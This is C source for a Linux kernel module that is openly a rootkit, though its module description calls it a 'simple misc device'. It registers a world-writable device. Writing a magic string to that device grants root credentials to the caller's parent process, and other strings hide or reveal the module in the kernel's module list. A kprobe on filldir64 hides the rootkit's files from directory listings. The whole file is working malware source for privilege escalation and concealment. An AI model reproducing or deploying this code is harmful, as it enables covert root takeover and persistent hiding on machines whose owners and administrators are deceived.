#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/stat.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>

#include "include/core.h"
#include "include/debug.h"


static int      __init mod_init(void);
static void     __exit mod_exit(void);
static int 	    mymisc_open(struct inode *i, struct file *f);
static int 	    mymisc_release(struct inode *i, struct file *f);
static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs);


int set_root(void);
int hide(void);
int unhide(void);

//############# DRIVER #############

int hidden;
static struct list_head *prev_module;

static struct file_operations fops =
{
    .owner      	    = THIS_MODULE,
    .read       	    = mymisc_read,
    .write		        = mymisc_write,
    .open       	    = mymisc_open,
    .release    	    = mymisc_release,
    .unlocked_ioctl     = mymisc_ioctl
};


//https://github.com/torvalds/linux/blob/master/include/linux/miscdevice.h#L79
struct miscdevice mymisc = {
    .name = RK_DRIVER,
    .minor = MISC_DYNAMIC_MINOR,
    .fops = &fops,
    .mode = ( S_IRUGO |  S_IWUGO )
};


static int mymisc_open(struct inode *i, struct file *f)
{       
    RK_DEBUG("Device File Opened...!!!\n");
    return 0;
}

/*
** This function will be called when we close the Device file
*/

//release
static int mymisc_release(struct inode *i, struct file *f)
{       
        RK_DEBUG("Device File Closed...!!!\n");
        return 0;
}

//read
static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
{
        RK_DEBUG("Device have been read...!!!\n");
        return 0;
}


//write
static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{   
        RK_DEBUG("Got payload : %s", buf);
        
        if (strcmp(buf, RK_PRIVESC) == 0)
        {
            RK_DEBUG("Blud wanted to get root\n");
            int ret;

            ret = set_root();
            if (ret < 0)
            {
                RK_DEBUG("Privesc failed with error: %d\n", ret);
                return ret;
            }
            else 
                {RK_DEBUG("Should have got root\n");}
        } 

        else if (strcmp(buf, RK_HIDE) == 0)
        {
            int ret;
            RK_DEBUG("Hiding the rootkit\n");

            ret = hide();
            if (ret < 0)
            {
                RK_DEBUG("Rootkit already hidden.\n");
                return ret;
            } 
            else {
                RK_DEBUG("Should have hidden the rootkit\n");
            }
        }

        else if (strcmp(buf, RK_REVEAL) == 0)
        {
            int ret;
            RK_DEBUG("Revealing the rootkit\n");

            ret = unhide();
            if (ret < 0)
            {
                RK_DEBUG("Rootkit already shown.\n");
                return ret;
            } 
            else {
                RK_DEBUG("Should have revealed the rootkit\n");
            }
        }

        return len;        
}
 
//ioctl
static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg)
{
    RK_DEBUG("Device with ioctl...!!!\n");
    return 0;
}

//############# DISCRETION #############


int hide(void)
{   

    /*
    prev_module->next = THIS_MODULE->next
    THIS_MODULE->next->prev = prev_module
    */

    if (! hidden)
    {   
        prev_module = THIS_MODULE->list.prev; //sauvegarde de l'éntrée précedente de la liste chainée
        list_del(&THIS_MODULE->list); 
        hidden = 1;
        return 0;
    }

    else
        {return -1;}
}

int unhide(void)
{
    /*
    prev_module->next->prev = THIS_MODULE
    prev_module->next = THIS_MODULE
    THIS_MODULE->prev = prev_module 
    */

    if (hidden)
    {
        list_add(&THIS_MODULE->list, prev_module); 
        hidden = 0;
        return 0;
    }

    else 
        {return -1;}

}

//############# KPROBE #############$

static struct kprobe kp = 
{
    .symbol_name = "filldir64"
};


static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    
	char *filename = (char *)regs->si;

    if (
        strcmp(filename, RK_NAME) == 0 ||
        strcmp(filename, RK_DRIVER) == 0
    )
    {
        regs->dx = 0;
    }
	return 0;

}

//############# INIT & CLEANUP #############
static int __init mod_init(void)
{

    hide();
	int ret;
	ret = misc_register(&mymisc);
	if (ret < 0)
    {
        RK_DEBUG("misc_register() failed: %d\n", ret);
        return ret;
    }

    RK_DEBUG("Device successfully registered\n");


	kp.pre_handler = handler_pre;
	ret = register_kprobe(&kp);
	if (ret < 0) {
		RK_DEBUG("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	RK_DEBUG("filldir64: at %px\n", kp.addr);
	RK_DEBUG("handler_pre: at %px\n", &handler_pre);

    //list_del(&kp.list);
	return 0;
}


static void __exit mod_exit(void)
{
    misc_deregister(&mymisc);
    RK_DEBUG("misc_register exit done !!!\n");
    
    unregister_kprobe(&kp);
    //faire un list del de kp.list
    RK_DEBUG("kprobe unregistered\n");
}

int set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return -1;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    //commit_creds(root);


    struct task_struct *parent;
    parent = current->real_parent; //https://github.com/torvalds/linux/blob/bf9aa14fc523d2763fc9a10672a709224e8fcaf4/include/linux/sched.h#L1028   
    // Commit the new credentials to the parent process
    if (parent) {
        task_lock(parent); // Lock to modify safely
        parent->real_cred = root;
        parent->cred = root;
        task_unlock(parent); // Unlock after modification
        RK_DEBUG("rootkit: Parent process privileges escalated successfully.\n"); 

    } else {
        RK_DEBUG("rootkit: Parent task not found.\n");
        return 1;
    }
    return 0;
}    

module_init(mod_init)
module_exit(mod_exit)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("en vrai j'ai une privesc ca va");
MODULE_DESCRIPTION("simple misc device");
MODULE_VERSION("0.1.0");

